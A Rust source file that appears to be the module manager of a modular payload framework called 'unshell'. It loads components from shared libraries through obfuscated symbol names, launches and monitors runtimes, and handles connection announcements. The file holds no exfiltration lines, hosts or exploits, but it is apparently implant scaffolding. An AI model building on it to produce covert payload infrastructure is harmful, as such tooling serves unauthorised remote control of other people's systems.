mod announcement;
mod connection;

use std::{
    collections::HashMap,
    sync::{Arc, Mutex},
    thread::{self, JoinHandle},
    time::Duration,
};

use unshell_lib::{Announcement, Result, config::RuntimeConfig, debug, warn};
use unshell_obfuscate::symbol;

use crate::{
    ModuleRuntime,
    interface::{NamedComponent, PayloadConfig},
    module::Module,
    network::Stream,
};

// #[derive(Debug)]
pub struct Manager {
    id: &'static str,

    handle: Option<JoinHandle<()>>,

    pub modules: Vec<Module>,

    components: HashMap<String, NamedComponent>,
    active_runtimes: Vec<Box<dyn ModuleRuntime>>,

    pub connections: Vec<Box<dyn Stream<Announcement>>>,
}

// static mut MANAGER_RUNTIME: Option<Arc<Mutex<Manager>>> = None;

impl Manager {
    fn new(id: &'static str, components: Vec<NamedComponent>, modules: Vec<Module>) -> Self {
        Self {
            id,
            handle: None,

            modules,
            components: components
                .into_iter()
                .map(|c| (c.name.to_string(), c))
                .collect(),
            active_runtimes: Vec::new(),

            connections: Vec::new(),
        }
    }

    /// Create Manager, and run initialization for each Module
    #[allow(static_mut_refs)]
    pub fn start(config: &'static PayloadConfig, modules: Vec<Module>) -> Arc<Mutex<Self>> {
        // Construct self
        let mut this = Self::new(&config.id, config.components.clone(), modules);

        debug!("Imported {} base components", this.components.len());
        debug!("Imported {} base runtimes", &config.runtime_config.len());

        // Load each of the pre-prepared modules
        this.load_components();

        let this = Arc::new(Mutex::new(this));

        debug!("Creating runtimes...");
        for runtime in &config.runtime_config {
            Self::create_runtime(this.clone(), runtime);
        }

        debug!("Starting runtimes...");
        for runtime in &mut this.lock().unwrap().active_runtimes {
            if let Err(e) = runtime.init(this.clone()) {
                warn!("Failed to start runtime: {}", e);
            }
        }

        this.lock().unwrap().handle = Some(Self::start_thread(this.clone()));

        this
    }

    fn load_components(&mut self) {
        for module in &self.modules {
            // Load get_components function from shared object library
            let component_func = match module
                .get_symbol::<fn() -> Vec<NamedComponent>>(symbol!("get_components").as_bytes())
            {
                Ok(func) => func,
                Err(_) => {
                    warn!("get_components function not found");
                    continue;
                }
            };

            let components = component_func();
            let component_name = "TODO"; //TODO: Make this actually load component name

            debug!("{} - Retrieved payload metadata", component_name);

            // Add each component into self
            for c in components {
                debug!("{} - Found component '{}'", "TODO", c.name);
                self.components.insert(c.name.to_owned(), c);
            }
        }
    }

    /// The manager thread. receives announcements, and kills runtimes.
    fn start_thread(this: Arc<Mutex<Self>>) -> JoinHandle<()> {
        thread::spawn(move || {
            loop {
                thread::sleep(Duration::from_millis(10));

                let mut this_lock = this.lock().unwrap();

                if this_lock.active_runtimes.len() <= 0 {
                    debug!("There are no more runtimes! Exiting...");
                    break;
                }

                this_lock.active_runtimes.retain(|runtime| {
                    if runtime.is_running() {
                        true
                    } else {
                        debug!("Runtime exited!"); //TODO: Make this better
                        false
                    }
                });

                // Read announcements
                this_lock.recv_connection_announcements();

                // Prune dead connections
                this_lock.prune_connections();

                drop(this_lock)
            }
        })
    }

    /// Wait for manager thread to finish.
    pub fn join(this: Arc<Mutex<Self>>) {
        loop {
            if this.lock().unwrap().handle.as_ref().unwrap().is_finished() {
                break;
            }

            thread::sleep(Duration::from_millis(100));
        }
    }

    /// Start a runtime
    fn create_runtime<'a>(this: Arc<Mutex<Self>>, runtime: &'static RuntimeConfig) {
        let mut this_lock = this.lock().unwrap();

        let component = match this_lock.components.get(&runtime.parent_component) {
            Some(component) => component,
            None => {
                warn!(
                    "Could not find component '{}' which is referenced by runtime: {}",
                    runtime.parent_component, runtime.name
                );
                return;
            }
        };

        debug!("Starting runtime: {}", runtime.name);

        let runtime = match (*component.start_runtime)(runtime) {
            Ok(runtime) => runtime,
            Err(e) => {
                warn!("Failed to start runtime: {:?}", e);
                return;
            }
        };

        this_lock.active_runtimes.push(runtime);
    }

    pub fn add_runtime(this: Arc<Mutex<Self>>, runtime: &'static RuntimeConfig) -> Result<()> {
        Self::create_runtime(this.clone(), runtime);

        this.lock()
            .unwrap()
            .active_runtimes
            .iter_mut()
            .last()
            .unwrap()
            .init(this.clone())
    }

    pub fn get_name(&self) -> &str {
        self.id
    }
}
